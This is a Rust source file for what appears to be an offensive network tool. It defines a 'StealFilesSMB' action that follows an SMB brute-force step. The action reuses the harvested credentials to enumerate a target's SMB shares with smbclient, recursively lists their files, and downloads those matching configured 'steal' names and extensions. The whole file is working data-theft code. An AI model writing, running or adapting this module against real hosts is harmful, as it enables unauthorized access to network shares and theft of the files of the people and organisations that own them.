use std::sync::Arc;
use std::time::Duration;

use tokio::time::timeout;

use crate::actions::{Action, ActionOutcome, Target};
use crate::state::AppState;

use super::{build_output_dir, get_credentials};

/// Steal files from SMB shares using smbclient.
/// Parent: SMBBruteforce.
pub struct StealFilesSmb;

impl Action for StealFilesSmb {
    fn name(&self) -> &'static str { "StealFilesSMB" }
    fn port(&self) -> Option<u16> { Some(445) }
    fn parent(&self) -> Option<&'static str> { Some("SMBBruteforce") }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(run(target, state))
    }
}

async fn run(target: &Target, state: &Arc<AppState>) -> ActionOutcome {
    let creds = get_credentials(state, target.host_id, "smb").await;
    if creds.is_empty() {
        return ActionOutcome::Failed("no credentials".to_string());
    }

    let config = state.config();
    let file_names = &config.steal_file_names;
    let file_exts = &config.steal_file_extensions;
    let local_dir = build_output_dir(state, "smb", &target.mac_address, &target.ip);
    let _ = tokio::fs::create_dir_all(&local_dir).await;

    for (user, password) in &creds {
        if state.shutdown.is_cancelled() {
            break;
        }

        let result = timeout(Duration::from_secs(240), async {
            steal_via_smb(&target.ip, user, password, file_names, file_exts, &local_dir).await
        })
        .await;

        match result {
            Ok(Ok(count)) if count > 0 => {
                tracing::info!(ip = %target.ip, files = count, "files stolen via SMB");
                return ActionOutcome::Success;
            }
            _ => {}
        }
    }

    ActionOutcome::Failed("no files stolen".to_string())
}

async fn steal_via_smb(
    ip: &str,
    user: &str,
    password: &str,
    file_names: &[String],
    file_exts: &[String],
    local_dir: &std::path::Path,
) -> Result<usize, String> {
    // Step 1: List shares
    let shares_output = tokio::process::Command::new("smbclient")
        .args(["-L", ip, "-U", &format!("{user}%{password}"), "--timeout=10"])
        .output()
        .await
        .map_err(|e| e.to_string())?;

    let stdout = String::from_utf8_lossy(&shares_output.stdout);
    let shares: Vec<String> = stdout
        .lines()
        .filter(|l| l.contains("Disk"))
        .filter_map(|l| l.split_whitespace().next())
        .filter(|s| !["IPC$", "print$"].contains(s))
        .map(|s| s.to_string())
        .collect();

    let mut total = 0;

    for share in &shares {
        // Step 2: List files in share recursively
        let list_output = tokio::process::Command::new("smbclient")
            .args([
                &format!("//{ip}/{share}"),
                "-U",
                &format!("{user}%{password}"),
                "--timeout=10",
                "-c",
                "recurse ON; ls",
            ])
            .output()
            .await;

        let files_stdout = match list_output {
            Ok(o) if o.status.success() => String::from_utf8_lossy(&o.stdout).to_string(),
            _ => continue,
        };

        // Parse file listings and find matches
        let matching: Vec<String> = files_stdout
            .lines()
            .filter(|l| {
                let l = l.trim();
                file_exts.iter().any(|ext| l.ends_with(ext.as_str()))
                    || file_names.iter().any(|name| l.contains(name.as_str()))
            })
            .filter_map(|l| {
                let trimmed = l.trim();
                trimmed.split_whitespace().next().map(|s| s.to_string())
            })
            .collect();

        let share_dir = local_dir.join(share);
        let _ = tokio::fs::create_dir_all(&share_dir).await;

        // Step 3: Download matching files
        for file in &matching {
            let get_cmd = format!("get \"{file}\" \"{}/{}\"",
                share_dir.display(),
                file.rsplit('/').next().unwrap_or(file));

            let _ = tokio::process::Command::new("smbclient")
                .args([
                    &format!("//{ip}/{share}"),
                    "-U",
                    &format!("{user}%{password}"),
                    "--timeout=10",
                    "-c",
                    &get_cmd,
                ])
                .status()
                .await;

            total += 1;
        }
    }

    Ok(total)
}
